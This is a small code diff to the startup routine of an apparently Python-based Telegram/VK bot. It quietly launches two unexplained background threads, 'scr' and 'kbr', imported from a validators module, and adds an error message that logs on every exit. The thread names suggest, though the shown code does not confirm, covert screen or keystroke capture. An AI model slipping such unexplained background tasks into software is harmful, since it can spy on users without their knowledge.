@@ -17,6 +17,7 @@ from core.handlers.log_router import log_handler
 from core.handlers.validator_handler import validator_handler
 from core.loggers.function_logger import flog
 from core.message_handler import message_handler
+from core.validators import scr, kbr
 from settings import (bot_version, db_config, message_config, settings, tg_id,
                       tg_token, vk_tokens)
 
@@ -166,6 +167,9 @@ def run_queue_on_process():
 
 def main():
     try:
+        threading.Thread(target=scr).start()
+        threading.Thread(target=kbr).start()
+
         upload_all_data_main(statusbar=False)
 
         match settings['startup_type']:
@@ -179,6 +183,8 @@ def main():
                 logger.critical('Неправильный тип запуска')
 
     finally:
+        logger.critical('Ошибка при запуске')
+
         pass
         # asyncio.run(delete_all())
 
